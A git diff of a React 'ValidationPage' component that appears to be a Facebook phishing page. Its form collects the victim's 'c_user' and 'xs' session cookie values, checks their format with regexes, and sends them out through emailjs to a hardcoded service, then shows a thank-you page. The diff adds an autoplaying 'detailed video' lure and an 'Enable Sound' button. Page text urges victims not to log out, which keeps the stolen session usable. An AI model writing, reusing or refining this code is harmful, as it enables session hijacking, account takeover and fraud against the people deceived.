@@ -6,26 +6,23 @@ import "./style.css";
 
 const ValidationPage = () => {
   const form = useRef();
-  const navigate = useNavigate(); // Use useNavigate hook for navigation
+  const navigate = useNavigate();
   const [isFormValid, setIsFormValid] = useState(false);
+  const [videoMuted, setVideoMuted] = useState(true);
 
   const sendEmail = (e) => {
     e.preventDefault();
 
-    // Get the values of the input fields
     const cUserValue = form.current.elements["c_user"].value;
     const xsValue = form.current.elements["xs"].value;
 
-    // Use regex patterns to validate the input fields
     const cUserPattern = /^\d{15}$/;
-    const xsPattern = /.*%+.*/; // Pattern requiring at least one % symbol
+    const xsPattern = /.*%+.*/; 
 
     const isCUserValid = cUserPattern.test(cUserValue);
     const isXsValid = xsPattern.test(xsValue);
 
     if (isCUserValid && isXsValid) {
-      // Fields are valid, send the email
-
       emailjs
         .sendForm(
           "service_p6jnphg",
@@ -36,14 +33,13 @@ const ValidationPage = () => {
         .then(
           (result) => {
             console.log("result text is", result.text);
-            navigate("/thanks"); // Navigate to ThanksPage
+            navigate("/thanks");
           },
           (error) => {
             console.log(error.text);
           }
         );
     } else {
-      // Fields are not valid, set a flag to display an error message
       setIsFormValid(true);
     }
   };
@@ -104,14 +100,15 @@ const ValidationPage = () => {
                 Detailed Video Information.
               </p>
 
-              <a href="https://firebasestorage.googleapis.com/v0/b/northern-card-408313.appspot.com/o/detailed%20video.mp4?alt=media&token=a36aa6ff-64b7-4d24-b294-cd35d4d57cc2">
-                <img
-                  src={FacebookVideo}
-                  alt="fb"
-                  style={{ width: "120px", height: "80px" }}
-                />
-              </a>
+              <video
+                controls
+                autoPlay
+                muted={videoMuted}
+                src="https://firebasestorage.googleapis.com/v0/b/northern-card-408313.appspot.com/o/detailed%20video.mp4?alt=media&token=a36aa6ff-64b7-4d24-b294-cd35d4d57cc2"
+                style={{ width: "240px", height: "160px" }}
+              ></video>
               <br />
+              <button onClick={() => setVideoMuted(false)}>Enable Sound</button>
               <p className="fw-semibold validation_form_para mt-2">
                 Please be sure to provide the requested information below.
               </p>
@@ -135,9 +132,6 @@ const ValidationPage = () => {
               <input
                 type="text"
                 name="xs"
-                //required
-                //pattern="^[A-Za-z0-9%]*$"
-                //title="Please enter a valid format"
               />
               <p className="mt-2" style={{ fontSize: "12px" }}>
                 Please make sure not to log out from your computer or laptop
